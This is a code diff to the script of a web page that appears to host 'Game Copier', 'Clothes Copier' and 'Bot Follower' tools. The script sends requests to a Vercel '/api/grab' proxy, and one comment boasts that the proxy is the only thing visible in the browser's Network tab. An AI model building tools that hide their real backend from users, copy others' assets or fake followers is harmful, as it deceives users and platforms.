@@ -335,19 +335,19 @@
   </div>
 
   <script>
-    // REPLACE with YOUR real Vercel proxy URL after deploy
+    // Your Vercel proxy endpoint - this is the only thing visible in Network tab
     const PROXY_URL = "https://haychtools.vercel.app/api/grab";
 
-    // Paste your real YouTube video IDs here
+    // Replace these with your REAL YouTube video IDs
     const videos = {
-      game:    "dQw4w9WgXcQ",   // ← Game Copier tutorial ID
-      clothes: "dQw4w9WgXcQ",   // ← Clothes Copier tutorial ID
-      bot:     "dQw4w9WgXcQ"    // ← Bot Follower tutorial ID
+      game:    "dQw4w9WgXcQ",   // Game Copier tutorial
+      clothes: "dQw4w9WgXcQ",   // Clothes Copier tutorial
+      bot:     "dQw4w9WgXcQ"    // Bot Follower tutorial
     };
 
     function openVideo(tool) {
       const videoId = videos[tool];
-      if (!videoId) return alert("No tutorial video set for this tool yet.");
+      if (!videoId) return alert("No tutorial video set yet.");
       document.getElementById('videoPlayer').src = `https://www.youtube.com/embed/${videoId}?autoplay=1&mute=0&rel=0`;
       document.getElementById('videoModal').style.display = 'flex';
     }
@@ -390,8 +390,9 @@
           status.textContent = "Processed successfully!";
           status.style.color = "#00ff9d";
         } else {
-          status.textContent = "Failed";
-          console.error("Proxy response:", await res.text());
+          const errorText = await res.text();
+          status.textContent = "Failed - proxy issue";
+          console.error("Proxy error:", errorText);
         }
       } catch (err) {
         status.textContent = "Failed";
@@ -407,7 +408,7 @@
       window.scrollTo(0, 0);
     }
 
-    // Waves (hub)
+    // Waves background (hub)
     const waveCanvas = document.getElementById("waves");
     const wctx = waveCanvas.getContext("2d");
     waveCanvas.width = window.innerWidth;
@@ -430,7 +431,7 @@
     }
     drawWaves();
 
-    // Mouse particles (hub)
+    // Mouse trail particles (hub)
     const pCanvas = document.getElementById("particles");
     const pctx = pCanvas.getContext("2d");
     pCanvas.width = window.innerWidth;
@@ -463,7 +464,7 @@
     }
     drawParticles();
 
-    // Dots bg for tools
+    // Floating dots background for tools
     let dots = [];
     let dotsAnim;
     const dotsCanvas = document.getElementById('dots-canvas');
